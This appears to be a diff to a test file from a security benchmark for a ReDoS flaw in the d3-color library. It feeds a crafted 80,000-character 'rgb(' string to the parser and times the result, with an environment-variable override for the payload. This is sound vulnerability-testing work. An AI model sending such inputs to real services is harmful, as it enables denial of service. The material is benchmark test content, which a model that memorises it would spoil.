@@ -1,7 +1,7 @@
 test("ReDoS in d3-color", () => {
   const measureTime = require("../utils").measureTime;
   const d3Color = require("d3-color");
-  let attack_str = "rgb(" + "1".repeat(80000) + "!";
+  let attack_str = process.env.SECBENCH_PAYLOAD || ("rgb(" + "1".repeat(80000) + "!");
   let t = measureTime(function () {
     d3Color.rgb(attack_str);
   });
